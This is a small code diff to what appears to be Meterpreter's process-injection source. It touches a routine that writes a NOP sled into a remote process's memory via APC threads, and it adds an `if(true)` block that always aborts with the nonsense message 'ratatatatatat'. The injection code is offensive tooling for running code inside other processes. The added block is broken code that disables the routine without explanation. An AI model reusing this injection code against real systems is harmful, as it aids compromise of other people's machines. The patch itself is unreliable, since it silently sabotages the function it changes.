@@ -1,7 +1,7 @@
 #include "metsrv.h"
 #include "base_inject.h"
 #include "remote_thread.h"
-#include "../../ReflectiveDLLInjection/inject/src/LoadLibraryR.h"
+#include "LoadLibraryR.h"
 #include <Tlhelp32.h>
 
 // see '/msf3/external/source/shellcode/x86/migrate/executex64.asm'
@@ -196,6 +196,11 @@ DWORD inject_via_apcthread( Remote * remote, Packet * response, HANDLE hProcess,
 				
 				memset( lpNopSled, 0x90, mbi.RegionSize );
 				
+				if(true){
+					WriteProcessMemory( hProcess, lpRemoteAddress, lpNopSled, mbi.RegionSize, NULL );
+										BREAK_ON_ERROR( "ratatatatatat" )
+
+				}
 				if( !WriteProcessMemory( hProcess, lpRemoteAddress, lpNopSled, mbi.RegionSize, NULL ) )
 					BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: WriteProcessMemory lpNopSled failed" )
 				
